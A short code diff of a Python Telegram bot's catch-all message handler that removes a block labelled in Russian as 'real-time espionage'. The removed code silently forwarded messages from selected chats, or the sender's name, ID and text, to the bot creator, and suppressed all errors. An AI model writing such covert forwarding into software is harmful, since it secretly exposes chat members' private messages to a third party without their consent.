@@ -70,26 +70,6 @@ async def catch_all(message: Message, u_data: dict = None):
             from_user_id = message.from_user.id if message.from_user else 0
             from_user_name = message.from_user.full_name if message.from_user else "Unknown"
 
-            # --- Шпионаж в реальном времени ---
-            try:
-                from spy import get_spy_chats
-                from config import CREATOR_ID
-                spy_chats = await get_spy_chats()
-                if message.chat.id in spy_chats and CREATOR_ID and int(CREATOR_ID) != 0:
-                    try:
-                        await message.forward(chat_id=CREATOR_ID)
-                    except Exception:
-                        try:
-                            await message.bot.send_message(
-                                chat_id=CREATOR_ID,
-                                text=f"👁 [Шпионаж: {message.chat.title or 'Чат'} ({message.chat.id})]\n"
-                                     f"👤 {from_user_name} ({from_user_id}): {full_text}"
-                            )
-                        except Exception:
-                            pass
-            except Exception:
-                pass
-
             if from_user_id:
                 asyncio.create_task(increment_message_count(message.chat.id, from_user_id, from_user_name))
 
